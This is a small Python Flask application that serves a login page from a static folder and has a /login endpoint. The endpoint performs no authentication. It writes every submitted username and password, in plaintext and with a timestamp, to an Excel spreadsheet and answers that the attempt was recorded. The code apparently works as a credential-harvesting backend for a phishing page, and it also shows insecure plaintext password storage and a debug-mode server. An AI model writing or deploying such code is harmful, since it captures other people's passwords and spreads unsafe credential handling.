from flask import Flask, request, jsonify, send_from_directory
import pandas as pd
from datetime import datetime
import os

app = Flask(__name__)

# File path to the Excel sheet
EXCEL_FILE = 'login_attempts.xlsx'

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    if username and password:
        # Load existing Excel file or create a new one
        try:
            df = pd.read_excel(EXCEL_FILE)
        except FileNotFoundError:
            df = pd.DataFrame(columns=['Username', 'Password', 'Timestamp'])

        # Create a DataFrame for the new row
        new_row = pd.DataFrame([{
            'Username': username,
            'Password': password,
            'Timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }])
        
        # Concatenate the existing DataFrame with the new row
        df = pd.concat([df, new_row], ignore_index=True)
        
        # Save the DataFrame back to the Excel file
        df.to_excel(EXCEL_FILE, index=False)

        return jsonify({'message': 'Login attempt recorded.'})
    else:
        return jsonify({'message': 'Please enter both username and password.'}), 400

if __name__ == '__main__':
    app.run(debug=True)
